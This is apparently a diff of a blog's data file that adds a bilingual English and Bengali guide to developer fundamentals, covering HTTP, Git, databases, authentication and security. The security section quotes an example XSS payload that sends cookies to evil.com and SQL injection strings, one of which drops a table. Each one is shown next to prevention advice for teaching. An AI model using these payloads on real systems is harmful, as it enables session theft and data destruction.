-This "all or nothing" guarantee is called **ACID** (Atomicity, Consistency, Isolation, Durability) — the foundation of reliable data storage.
+---
+
+## 6. Authentication & Authorization
+
+![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image.png|Authentication & Authorization]
+![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy.png|Authentication & Authorization 2]
+![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy%202.png|Authentication & Authorization 3]
+![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy%203.png|Authentication & Authorization 4]
+![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy%204.png|Authentication & Authorization 5]
+![gallery:/dev-fundamentals/Section:%20Authentication%20%26%20Authorization/image%20copy%205.png|Authentication & Authorization 6]
+
+Authentication answers: **who are you?**
+Authorization answers: **what are you allowed to do?**
+
+These are two different concepts that developers often confuse.
+
+### Sessions vs JWT
+
+**Session-based auth (stateful):**
+\`\`\`
+1. User logs in with email + password
+2. Server verifies credentials
+3. Server creates a session in the database
+4. Server sends a session ID in a cookie
+5. On every request, browser sends the cookie
+6. Server looks up the session ID in the database
+7. If found and valid, request is authorized
+\`\`\`
+
+**JWT-based auth (stateless):**
+\`\`\`
+1. User logs in with email + password
+2. Server verifies credentials
+3. Server creates a signed JWT token containing user data
+4. Server sends the JWT to the client
+5. Client stores it (cookie or memory)
+6. On every request, client sends the JWT
+7. Server verifies the signature — no database lookup needed
+\`\`\`
+
+### JWT Deep Dive
+
+A JWT has three parts separated by dots:
+
+\`\`\`
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.abc123
+      HEADER                        PAYLOAD                  SIGNATURE
+\`\`\`
+
+- **Header:** algorithm used (HS256, RS256)
+- **Payload:** the data (userId, role, expiry) — NOT encrypted, just base64 encoded
+- **Signature:** HMAC of header + payload using your secret key
+
+\`\`\`javascript
+// Creating a JWT
+const token = jwt.sign(
+  { userId: 1, role: "admin" },   // payload
+  process.env.JWT_SECRET,          // secret
+  { expiresIn: "7d" }              // options
+);
+
+// Verifying a JWT
+try {
+  const decoded = jwt.verify(token, process.env.JWT_SECRET);
+  console.log(decoded.userId); // 1
+} catch (err) {
+  // Token is invalid or expired
+}
+\`\`\`
+
+**Critical:** The payload is only base64 encoded, not encrypted. Anyone can decode it. Never put sensitive data (passwords, credit cards) in a JWT payload.
+
+### Password Hashing
+
+Never store plain text passwords. Always hash with bcrypt:
+
+\`\`\`javascript
+import bcrypt from "bcryptjs";
+
+// Hash password before saving to database
+const hash = await bcrypt.hash(plainPassword, 12); // 12 = cost factor
+await db.user.create({ email, password: hash });
+
+// Verify password on login
+const isValid = await bcrypt.compare(plainPassword, hash);
+if (!isValid) throw new Error("Invalid credentials");
+\`\`\`
+
+Bcrypt is slow by design — that is the point. It makes brute-force attacks computationally expensive.
+
+### OAuth 2.0 — Login with Google/GitHub
+
+OAuth lets users authenticate using a third-party provider without sharing their password with your app.
+
+\`\`\`
+1. User clicks "Login with Google"
+2. Your app redirects to Google's auth page
+3. User approves access
+4. Google redirects back with an authorization code
+5. Your server exchanges the code for an access token
+6. Your server uses the token to get user info from Google
+7. Your server creates/finds the user in your database
+8. Your server issues your own JWT/session
+\`\`\`
+
+### Role-Based Access Control (RBAC)
+
+\`\`\`javascript
+// Middleware to check role
+function requireRole(role) {
+  return (req, res, next) => {
+    if (req.user.role !== role) {
+      return res.status(403).json({ error: "Forbidden" });
+    }
+    next();
+  };
+}
+
+// Usage
+router.delete("/users/:id", authenticate, requireRole("admin"), deleteUser);
+\`\`\`
+
+### Secure Cookie Settings
+
+\`\`\`javascript
+res.cookie("token", jwt, {
+  httpOnly: true,   // JS cannot access it (prevents XSS)
+  secure: true,     // only sent over HTTPS
+  sameSite: "lax",  // prevents CSRF attacks
+  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
+});
+\`\`\`
+
+---
+
+## 7. Security Fundamentals
+
+![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image.png|Security Fundamentals]
+![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy.png|Security Fundamentals 2]
+![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%202.png|Security Fundamentals 3]
+![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%203.png|Security Fundamentals 4]
+![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%204.png|Security Fundamentals 5]
+![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%205.png|Security Fundamentals 6]
+![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%206.png|Security Fundamentals 7]
+![gallery:/dev-fundamentals/Section:%20Security%20Fundamentals/image%20copy%207.png|Security Fundamentals 8]
+
+Security is not a feature you add at the end. It is a mindset you apply from the first line of code. These are the four attacks every developer must understand and prevent.
+
+### XSS — Cross-Site Scripting
+
+XSS happens when an attacker injects malicious JavaScript into your page that runs in other users' browsers.
+
+\`\`\`javascript
+// Attacker submits this as their username:
+// <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+
+// If you render it without escaping:
+// <p>Welcome, {username}</p>  — the script executes for every visitor
+\`\`\`
+
+**Prevention:**
+\`\`\`javascript
+// React escapes output automatically — never use dangerouslySetInnerHTML with user data
+
+// Set Content Security Policy header
+"Content-Security-Policy": "default-src 'self'"
+
+// Use HttpOnly cookies — JS cannot read them even if XSS occurs
+res.cookie("token", jwt, { httpOnly: true });
+\`\`\`
+
+### CSRF — Cross-Site Request Forgery
+
+CSRF tricks a logged-in user's browser into making an unwanted request to your server.
+
+\`\`\`
+1. User is logged into bank.com (has valid session cookie)
+2. User visits evil.com
+3. evil.com has a hidden form that auto-submits to bank.com/transfer
+4. Browser sends the bank.com cookie automatically
+5. Bank processes the transfer as if the user did it
+\`\`\`
+
+**Prevention:**
+\`\`\`javascript
+// SameSite cookies — browser won't send on cross-site requests
+res.cookie("session", id, { sameSite: "lax" });
+\`\`\`
+
+### SQL Injection
+
+SQL injection happens when user input is directly concatenated into a SQL query.
+
+\`\`\`javascript
+// VULNERABLE — never do this
+const query = \`SELECT * FROM users WHERE email = '\${req.body.email}'\`;
+// Attacker sends: ' OR '1'='1  — returns ALL users
+// Worse: '; DROP TABLE users; --
+
+// SAFE — always use parameterized queries
+const result = await db.query(
+  "SELECT * FROM users WHERE email = $1",
+  [req.body.email] // passed separately, never concatenated
+);
+\`\`\`
+
+### Security Headers
+
+\`\`\`javascript
+// next.config.ts — add to every response
+const securityHeaders = [
+  { key: "X-Frame-Options",           value: "DENY" },
+  { key: "X-Content-Type-Options",    value: "nosniff" },
+  { key: "Referrer-Policy",           value: "strict-origin-when-cross-origin" },
+  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains" },
+];
+\`\`\`
+
+### Rate Limiting
+
+Without rate limiting, attackers can brute-force passwords or exhaust your server resources.
+
+\`\`\`javascript
+// 10 requests per minute per IP
+if (!rateLimit(\`chat:\${ip}\`, 10, 60_000)) {
+  return res.status(429).json({ error: "Too many requests" });
+}
+
+// Stricter for auth — 5 attempts per hour
+if (!rateLimit(\`login:\${ip}\`, 5, 60 * 60_000)) {
+  return res.status(429).json({ error: "Too many login attempts" });
+}
+\`\`\`
+
+---
+
+## 8. Networking Basics
+
+![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image.png|APIs & Backend]
+![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy.png|APIs & Backend 2]
+![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%202.png|APIs & Backend 3]
+![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%203.png|APIs & Backend 4]
+![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%204.png|APIs & Backend 5]
+![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%205.png|APIs & Backend 6]
+![gallery:/dev-fundamentals/APIs%20%26%20Backend%20Fundamentals/image%20copy%206.png|APIs & Backend 7]
+![gallery:/dev-fundamentals/System%20Design/image.png|System Design]
+![gallery:/dev-fundamentals/System%20Design/image%20copy.png|System Design 2]
+![gallery:/dev-fundamentals/System%20Design/image%20copy%202.png|System Design 3]
+![gallery:/dev-fundamentals/System%20Design/image%20copy%203.png|System Design 4]
+![gallery:/dev-fundamentals/System%20Design/image%20copy%204.png|System Design 5]
+![gallery:/dev-fundamentals/System%20Design/image%20copy%205.png|System Design 6]
+
+Understanding networking makes you a better developer and a better debugger. When something breaks in production, networking knowledge tells you where to look.
+
+### TCP vs UDP
+
+| | TCP | UDP |
+|---|---|---|
+| Reliability | Guaranteed delivery | Best effort |
+| Order | In order | May arrive out of order |
+| Speed | Slower (handshake + ACK) | Faster (no overhead) |
+| Use cases | HTTP, databases, email | Video streaming, gaming, DNS |
+
+### WebSockets
+
+HTTP is request-response — the client always initiates. WebSockets provide a persistent, bidirectional connection.
+
+\`\`\`javascript
+// Server
+const wss = new WebSocketServer({ port: 8080 });
+wss.on("connection", (ws) => {
+  ws.on("message", (data) => {
+    wss.clients.forEach((client) => client.send(data)); // broadcast
+  });
+});
+
+// Client
+const ws = new WebSocket("wss://api.example.com");
+ws.onmessage = (event) => console.log(event.data);
+ws.send(JSON.stringify({ type: "message", text: "Hello" }));
+\`\`\`
+
+Use WebSockets for: real-time chat, live notifications, collaborative editing, live dashboards.
+
+### CDN — Content Delivery Network
+
+A CDN is a network of servers distributed globally. Static files are served from the nearest node instead of your origin server.
+
+\`\`\`
+User in Bangladesh  →  CDN node in Singapore  →  fast response
+User in Germany     →  CDN node in Frankfurt  →  fast response
+
+Without CDN:
+User in Bangladesh  →  Origin server in US    →  slow response
+\`\`\`
+
+Next.js on Vercel automatically puts your static assets on a CDN.
+
+### DNS Record Types
+
+\`\`\`
+A record     — domain → IPv4 address
+               tushar.dev → 76.76.21.21
+
+CNAME record — domain → another domain
+               www.tushar.dev → tushar.dev
+
+MX record    — mail server for the domain
+
+TXT record   — arbitrary text (domain verification, SPF)
+\`\`\`
+
+---
+
+## Conclusion
+
+![gallery:/dev-fundamentals/Full%20Concept%20in%20One%20image/image.png|Full Concept Overview]
+
+These eight fundamentals are not optional knowledge. They are the foundation that every other skill in software development is built on.
+
+A developer who understands how HTTP works will debug API issues in minutes instead of hours. A developer who understands Git will never lose work or break a team's codebase. A developer who understands security will not ship vulnerabilities that compromise their users.
+
+The frameworks change every few years. These fundamentals do not.
+
+**Learn the fundamentals deeply. Everything else becomes easier.**
     `.trim(),
     contentBn: `
 ## ভূমিকা
 
-![gallery:/dev-fundamentals/Hero%20Image/image.png|Hero Image]
-![gallery:/dev-fundamentals/Hero%20Image/image%20copy.png|Hero Image 2]
-![gallery:/dev-fundamentals/Hero%20Image/image%20copy%202.png|Hero Image 3]
-![gallery:/dev-fundamentals/Hero%20Image/image%20copy%203.png|Hero Image 4]
-![gallery:/dev-fundamentals/Hero%20Image/image%20copy%204.png|Hero Image 5]
-![gallery:/dev-fundamentals/Hero%20Image/image%20copy%205.png|Hero Image 6]
-
 প্রতিটি developer framework শেখে। কিন্তু সবাই বোঝে না যে নিচে আসলে কী হচ্ছে।
 
-HTTP কীভাবে কাজ করে সেটা না জেনেও Next.js app বানানো যায়। Commit আসলে কী সেটা না বুঝেও Git ব্যবহার করা যায়। কিন্তু যখন production এ কিছু ভাঙবে — আর ভাঙবেই — এই fundamentals ছাড়া তুমি সম্পূর্ণ হারিয়ে যাবে।
+HTTP কীভাবে কাজ করে সেটা না জেনেও Next.js app বানানো যায়। Commit আসলে কী সেটা না বুঝেও Git ব্যবহার করা যায়। JWT কেন secure সেটা না জেনেও JWT auth implement করা যায়। কিন্তু যখন production এ কিছু ভাঙবে — আর ভাঙবেই — এই fundamentals ছাড়া তুমি সম্পূর্ণ হারিয়ে যাবে।
 
-একটা analogy দিয়ে বলি: একজন driver গাড়ি চালাতে পারে engine কীভাবে কাজ করে সেটা না জেনেও। কিন্তু রাত ১২টায় highway তে গাড়ি বন্ধ হয়ে গেলে সেই জ্ঞানটা হঠাৎ অনেক জরুরি হয়ে পড়ে।
-
-এই guide এ ৮টি core concept cover করা হয়েছে যেগুলো প্রতিটি developer এর crystal clear থাকা দরকার।
+এই guide এ সেই আটটি concept cover করা হয়েছে যেগুলো শুধু code লেখা developer আর সত্যিকারের বোঝা developer এর মধ্যে পার্থক্য তৈরি করে।
 
 ---
 
 ## ১. Internet কীভাবে কাজ করে
 
-![gallery:/dev-fundamentals/Section:%20Internet_Networking/image.png|Internet & Networking]
-![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy.png|Internet & Networking 2]
-![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%202.png|Internet & Networking 3]
-![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%203.png|Internet & Networking 4]
-![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%204.png|Internet & Networking 5]
-![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%205.png|Internet & Networking 6]
-
-**কেন জানা দরকার:** তোমার প্রতিটি API call, প্রতিটি page load, প্রতিটি database query — সব কিছু এই protocols এর উপর চলে। API slow কেন, request fail কেন, CORS error কেন — এই section জানলে সব বুঝতে পারবে।
+যতবার তুমি browser খুলে URL টাইপ করো, millisecond এর মধ্যে একটা অসাধারণ ঘটনার chain ঘটে।
 
 ### বড় ছবি
-
-\`https://google.com\` টাইপ করে Enter চাপলে কী হয়:
 
 \`\`\`
 তুমি টাইপ করো: https://google.com
          ↓
-১. DNS Lookup      — "google.com এর IP address কী?"
-২. TCP Handshake   — "একটা reliable connection তৈরি করি"
-৩. TLS Handshake   — "connection টা encrypt করি"
-৪. HTTP Request    — "homepage দাও"
-৫. Server Response — "এই নাও HTML"
-৬. Browser Render  — "user কে দেখাই"
+১. DNS Lookup      — domain কে IP address এ translate করো
+২. TCP Handshake   — connection establish করো
+৩. TLS Handshake   — connection secure করো (HTTPS)
+৪. HTTP Request    — browser page চায়
+৫. Server Response — server HTML/CSS/JS পাঠায়
+৬. Browser Render  — browser page দেখায়
 \`\`\`
 
 ### DNS — Internet এর Phone Book
 
-ধরো তুমি বন্ধুকে call করতে চাও। তুমি তার phone number মুখস্থ রাখো না — contacts এ নাম search করো, phone নিজেই number খুঁজে নেয়। DNS ঠিক এভাবেই কাজ করে।
+DNS (Domain Name System) human-readable domain name কে IP address এ translate করে।
 
-DNS (Domain Name System) \`google.com\` এর মতো human-readable domain name কে \`142.250.80.46\` এর মতো IP address এ translate করে।
+যখন তুমি \`google.com\` টাইপ করো:
+১. Browser নিজের DNS cache চেক করে
+২. OS local cache চেক করে
+৩. Query ISP এর DNS resolver এ যায়
+৪. Resolver root nameserver কে জিজ্ঞেস করে
+৫. Root nameserver .com nameserver এ point করে
+৬. .com nameserver Google এর nameserver এ point করে
+৭. Google এর nameserver IP return করে: \`142.250.80.46\`
 
-**Real-world impact:** Vercel এ app deploy করে custom domain add করার সময় তুমি একটা DNS A record তৈরি করো যেটা তোমার domain কে Vercel এর IP address এ point করে। DNS মানে এটুকুই।
+এই পুরো process ৫০ms এর কম সময় নেয়। Result cache হয় যাতে প্রতিটি request এ repeat না হয়।
 
-### TCP — Reliable Postman
+### TCP — Reliable Delivery
 
-ধরো একটা বড় বই ১০০ পাতায় ছিঁড়ে আলাদা আলাদা চিঠিতে পাঠাচ্ছো। কিছু পাতা হয়তো উল্টো order এ আসবে, কিছু হারিয়ে যাবে। TCP হলো সেই system যেটা নিশ্চিত করে সব ১০০ পাতা সঠিক order এ পৌঁছাবে।
+TCP নিশ্চিত করে যে data সম্পূর্ণভাবে এবং সঠিক order এ পৌঁছায়। কোনো data পাঠানোর আগে TCP একটি **three-way handshake** করে:
 
 \`\`\`
-Client → Server: SYN       ("কথা বলতে চাই")
-Server → Client: SYN-ACK   ("ঠিক আছে, ready")
-Client → Server: ACK       ("চমৎকার, শুরু করি")
+Client → Server: SYN       (আমি connect করতে চাই)
+Server → Client: SYN-ACK   (ঠিক আছে, আমি ready)
+Client → Server: ACK       (চমৎকার, শুরু করি)
 \`\`\`
 
-### HTTP vs HTTPS
+### HTTP Status Codes — যেগুলো অবশ্যই জানতে হবে
 
-HTTP হলো browser আর server এর মধ্যে কথা বলার ভাষা।
+| Code | অর্থ |
+|---|---|
+| 200 | OK — সফল |
+| 201 | Created — resource তৈরি হয়েছে |
+| 400 | Bad Request — client invalid data পাঠিয়েছে |
+| 401 | Unauthorized — authenticate হয়নি |
+| 403 | Forbidden — permission নেই |
+| 404 | Not Found — resource নেই |
+| 429 | Too Many Requests — rate limited |
+| 500 | Internal Server Error — server crash |
 
-**Analogy:** HTTP হলো postcard — যে handle করে সে পড়তে পারে। HTTPS হলো sealed locked envelope — শুধু recipient খুলতে পারে।
+---
 
-**HTTP Status Codes:**
+## ২. Browser কীভাবে কাজ করে
 
-| Code | অর্থ | কখন দেখবে |
+### Rendering Pipeline
+
+\`\`\`
+HTML bytes received
+       ↓
+১. HTML Parse   → DOM tree তৈরি
+২. CSS Parse    → CSSOM tree তৈরি
+৩. Combine      → Render Tree
+৪. Layout       → position ও size calculate
+৫. Paint        → pixels fill করো
+৬. Composite    → screen এ দেখাও
+\`\`\`
+
+### JavaScript Event Loop
+
+JavaScript **single-threaded** — একসাথে একটাই কাজ করতে পারে। Event Loop ক্রমাগত চেক করে: Call Stack কি খালি? যদি হ্যাঁ, Event Queue থেকে পরের callback নিয়ে execute করো।
+
+### localStorage vs sessionStorage vs Cookies
+
+**নিয়ম:** Auth token এর জন্য cookie ব্যবহার করো (\`HttpOnly\` এবং \`Secure\` flag সহ)। localStorage এ কখনো sensitive data রেখো না — page এর যেকোনো JavaScript এটা access করতে পারে।
+
+---
+
+## ৩. OS ও Terminal Basics
+
+প্রতিটি developer একটি operating system এ কাজ করে। বেশিরভাগ production server Linux চালায়। Terminal navigate করতে না পারলে তুমি GUI এর উপর নির্ভরশীল থাকবে যেটা production এ থাকবে না।
+
+### প্রয়োজনীয় Commands
+
+\`\`\`bash
+# Navigation
+pwd                  # current directory
+ls -la               # সব files দেখো (hidden সহ)
+cd projects          # directory change
+cd ..                # এক level উপরে
+
+# Files
+mkdir my-project     # directory তৈরি
+touch index.js       # empty file তৈরি
+rm -rf folder/       # folder delete (সাবধান!)
+
+# Processes
+lsof -i :3000        # port 3000 কে ব্যবহার করছে?
+kill -9 <PID>        # process force kill
+
+# Network
+curl https://api.example.com  # HTTP GET request
+\`\`\`
+
+### File Permissions
+
+\`\`\`
+r = read (4), w = write (2), x = execute (1)
+chmod 755 = rwxr-xr-x (owner: 7, group: 5, other: 5)
+\`\`\`
+
+### Environment Variables
+
+\`\`\`bash
+export DATABASE_URL="postgresql://localhost/mydb"
+echo $DATABASE_URL
+\`\`\`
+
+এটাই exactly কীভাবে Next.js এ \`.env.local\` কাজ করে — startup এ Node.js process এ environment variables inject করে।
+
+### SSH — Remote Server এ Connect করা
+
+\`\`\`bash
+ssh username@192.168.1.100
+ssh -i ~/.ssh/my-key.pem ubuntu@ec2-ip.amazonaws.com
+\`\`\`
+
+---
+
+## ৪. Git ও Version Control
+
+Git শুধু backup tool নয়। এটা একটা time machine, collaboration system, এবং safety net।
+
+### Git কীভাবে কাজ করে
+
+Git তোমার project কে **snapshots** এর series হিসেবে store করে। প্রতিটি commit হলো সেই মুহূর্তে সব file এর complete snapshot।
+
+### তিনটি Area
+
+\`\`\`
+Working Directory   ->   Staging Area   ->   Repository
+  (তোমার files)         (git add)          (git commit)
+\`\`\`
+
+### প্রয়োজনীয় Commands
+
+\`\`\`bash
+git status                    # কী পরিবর্তন হয়েছে?
+git add .                     # সব changes stage করো
+git commit -m "feat: add login"
+git push origin main          # remote এ push করো
+git pull origin main          # latest changes নাও
+
+# Branching
+git checkout -b feature/auth  # branch তৈরি + switch
+git merge feature/auth        # current branch এ merge
+\`\`\`
+
+### ভালো Commit Message লেখা
+
+\`\`\`bash
+# খারাপ
+git commit -m "fix"
+git commit -m "changes"
+
+# ভালো — Conventional Commits format
+git commit -m "feat: add user authentication with JWT"
+git commit -m "fix: resolve null pointer in login handler"
+\`\`\`
+
+### .gitignore
+
+**Critical rule:** কখনো \`.env\` file commit করো না। একবার Git history তে secret গেলে সেটা compromised — পরে delete করলেও history তে থেকে যায়।
+
+---
+
+## ৫. Databases — SQL vs NoSQL
+
+প্রতিটি application এ data store করতে হয়। ভুল database type বেছে নেওয়া একটা architectural mistake যেটা পরে fix করতে অনেক খরচ হয়।
+
+### Relational Databases (SQL)
+
+SQL database ডেটা table এ rows ও columns হিসেবে store করে। Schema strict — data insert করার আগে structure define করতে হয়।
+
+\`\`\`sql
+-- Table তৈরি
+CREATE TABLE users (
+  id        SERIAL PRIMARY KEY,
+  email     VARCHAR(255) UNIQUE NOT NULL,
+  name      VARCHAR(100) NOT NULL,
+  created_at TIMESTAMP DEFAULT NOW()
+);
+
+-- Query with JOIN
+SELECT posts.title, users.name
+FROM posts
+JOIN users ON posts.author_id = users.id
+ORDER BY posts.created_at DESC;
+
+-- Basic operations
+INSERT INTO users (email, name) VALUES ('tushar@example.com', 'Tushar');
+SELECT * FROM users WHERE email = 'tushar@example.com';
+UPDATE users SET name = 'Tushar Barua' WHERE id = 1;
+DELETE FROM users WHERE id = 1;
+\`\`\`
+
+### SQL vs NoSQL — কখন কোনটা
+
+| Factor | SQL (PostgreSQL) | NoSQL (MongoDB) |
 |---|---|---|
-| 200 | OK | সফল |
-| 201 | Created | নতুন resource তৈরি |
-| 400 | Bad Request | তুমি invalid data পাঠিয়েছ |
-| 401 | Unauthorized | login করোনি |
-| 403 | Forbidden | login করেছ কিন্তু permission নেই |
-| 404 | Not Found | resource নেই |
-| 500 | Server Error | server crash |
+| Data structure | Structured, consistent | Flexible, varying |
+| Relationships | Complex joins | Embedded documents |
+| Schema | Fixed, enforced | Dynamic, flexible |
+| Transactions | Full ACID support | Limited |
+| Best for | Financial, e-commerce | Content, catalogs |
 
-401 আর 403 এর পার্থক্য: **401** মানে "তুমি কে জানি না" (login নেই)। **403** মানে "তুমি কে জানি, কিন্তু এটা করতে পারবে না" (permission নেই)।
+**Rule of thumb:**
+- Default হিসেবে **PostgreSQL** ব্যবহার করো। ১৯৯% use case handle করে, full ACID transactions আছে।
+- **Redis** ব্যবহার করো caching, sessions, এবং sub-millisecond reads এর জন্য।
 
-### IP Address এবং Ports
+### Indexes — সবচেয়ে গুরুত্বপূর্ণ Performance Tool
 
-IP address হলো বাড়ির ঠিকানা। Port হলো সেই বাড়ির apartment number।
+\`\`\`sql
+-- Index ছাড়া: full table scan O(n)
+SELECT * FROM users WHERE email = 'tushar@example.com';
 
-\`\`\`
-IP Address = বাড়ি    (192.168.1.1)
-Port       = apartment (3000)
+-- Index তৈরি
+CREATE INDEX idx_users_email ON users(email);
 
-Common ports:
-80   → HTTP
-443  → HTTPS
-5432 → PostgreSQL
-3000 → Node.js dev server
+-- এখন একই query O(log n) তে হবে
+-- যে columns দিয়ে বারবার filter বা sort করো সেগুলোতে index দাও।
 \`\`\`
 
-\`pnpm dev\` চালালে \`localhost:3000\` দেখো — মানে তোমার নিজের machine এর (\`127.0.0.1\`) port \`3000\` এ connect হচ্ছ।
+### Transactions
+
+\`\`\`sql
+BEGIN;
+  UPDATE accounts SET balance = balance - 500 WHERE id = 1;
+  UPDATE accounts SET balance = balance + 500 WHERE id = 2;
+COMMIT;
+-- যদি কিছু fail হয়, ROLLBACK automatically দুটোই undo করে
+\`\`\`
+
+---
+
+## ৬. Authentication ও Authorization
+
+Authentication উত্তর দেয়: **তুমি কে?**
+Authorization উত্তর দেয়: **তুমি কী করতে পারবে?**
+
+এ দুটো আলাদা concept যেটা developer রা প্রায়ই confuse করে।
+
+### Sessions vs JWT
+
+**Session-based auth (stateful):**
+- User login করে, server database তে session তৈরি করে
+- Session ID cookie তে পাঠায়
+- প্রতিটি request এ server database lookup করে
+
+**JWT-based auth (stateless):**
+- User login করে, server signed JWT token তৈরি করে
+- প্রতিটি request এ server শুধু signature verify করে — database lookup দরকার নেই
+
+### JWT কীভাবে কাজ করে
+
+\`\`\`
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjF9.abc123
+      HEADER              PAYLOAD        SIGNATURE
+\`\`\`
+
+- **Header:** algorithm (HS256)
+- **Payload:** data (userId, role, expiry) — encrypted নয়, শুধু base64 encoded
+- **Signature:** secret key দিয়ে sign করা
+
+**Critical:** Payload শুধু base64 encoded, encrypted নয়। যেকেউ decode করতে পারে। JWT payload এ কখনো sensitive data রেখো না।
+
+### Password Hashing
+
+কখনো plain text password store করো না। সবসময় bcrypt দিয়ে hash করো:
+
+\`\`\`javascript
+// Save করার আগে hash করো
+const hash = await bcrypt.hash(plainPassword, 12);
+
+// Login এ verify করো
+const isValid = await bcrypt.compare(plainPassword, hash);
+\`\`\`
+
+Bcrypt ইচ্ছাকৃতভাবে slow — এটাই উদ্দেশ্য। Brute-force attack কে computationally expensive করে তোলে।
+
+### Secure Cookie Settings
+
+\`\`\`javascript
+res.cookie("token", jwt, {
+  httpOnly: true,   // JS access করতে পারবে না (XSS prevent)
+  secure: true,     // শুধু HTTPS এ পাঠাবে
+  sameSite: "lax",  // CSRF attack prevent
+  maxAge: 7 * 24 * 60 * 60 * 1000,
+});
+\`\`\`
+
+---
+
+## ৭. Security Fundamentals
+
+Security শেষে add করার জিনিস নয়। এটা প্রথম লাইন থেকেই apply করার mindset।
+
+### XSS — Cross-Site Scripting
+
+XSS হয় যখন attacker তোমার page এ malicious JavaScript inject করে যেটা অন্য user দের browser এ run হয়।
+
+**Prevention:**
+- React automatically output escape করে — user data তে কখনো \`dangerouslySetInnerHTML\` ব্যবহার করো না
+- \`HttpOnly\` cookie ব্যবহার করো — XSS হলেও JS token পড়তে পারবে না
+
+### CSRF — Cross-Site Request Forgery
+
+CSRF logged-in user এর browser কে trick করে unwanted request করায়।
+
+**Prevention:** \`sameSite: "lax"\` cookie — browser cross-site request এ cookie পাঠাবে না।
+
+### SQL Injection
+
+\`\`\`javascript
+// ভুল — কখনো করো না
+const query = \`SELECT * FROM users WHERE email = '\${req.body.email}'\`;
+// Attacker: ' OR '1'='1  — সব user return করে
+
+// সঠিক — parameterized query
+const result = await db.query(
+  "SELECT * FROM users WHERE email = $1",
+  [req.body.email]
+);
+\`\`\`
+
+### Rate Limiting
+
+Rate limiting ছাড়া attacker brute-force password করতে পারে বা server রিসোর্স শেষ করতে পারে।
+
+---
+
+## ৮. Networking Basics
+
+Networking বোঝা তোমাকে ভালো developer এবং ভালো debugger বানায়।
+
+### TCP vs UDP
+
+| | TCP | UDP |
+|---|---|---|
+| Reliability | Guaranteed delivery | Best effort |
+| Speed | ধীর (handshake) | দ্রুত |
+| Use cases | HTTP, database | Video streaming, gaming |
+
+### WebSockets
+
+HTTP request-response — client সবসময় initiate করে। WebSocket persistent, bidirectional connection দেয়।
+
+Real-time chat, live notification, collaborative editing এর জন্য WebSocket ব্যবহার করো।
+
+### CDN — Content Delivery Network
+
+CDN globally distributed server এর network। Static files nearest node থেকে serve হয়।
+
+\`\`\`
+Bangladesh এর user  →  Singapore CDN  →  fast response
+Germany এর user    →  Frankfurt CDN  →  fast response
+\`\`\`
+
+Vercel এ Next.js deploy করলে static assets automatically CDN এ যায়।
+
+---
+
+## উপসংহার
+
+এই আটটি fundamental optional knowledge নয়। এগুলো সেই foundation যার উপর software development এর বাকি সব স্কিল দাঁড়িয়ে আছে।
+
+HTTP বোঝা developer API issue minutes এ debug করে। Git বোঝা developer কখনো কাজ হারায় না। Security বোঝা developer vulnerability ship করে না।
+
+Framework প্রতি কয়েক বছরে বদলায়। এই fundamentals বদলায় না।
+
+**Fundamentals গভীরভাবে শেখো। বাকি সব সহজ হয়ে যাবে।**
     `.trim(),
   },
-
-  {
-    slug: "cgip",
-    title: "Computer Graphics and Image Processing",
-    excerpt: "7th semester lab tasks for Computer Graphics and Image Processing course at USTC. Covers OpenGL, 2D/3D primitives, transformations, image processing algorithms and more.",
-    category: "Computer Graphics",
-    date: "2025-01-15",
-    readTime: "Ongoing",
-    tags: ["Computer Graphics", "Image Processing", "OpenGL", "C++", "Lab"],
-    content: "",
-    customHref: "/blog/cgip",
-  },
-
 ];
 
 export const categories = ["All", ...Array.from(new Set(blogPosts.map((p) => p.category)))];
+
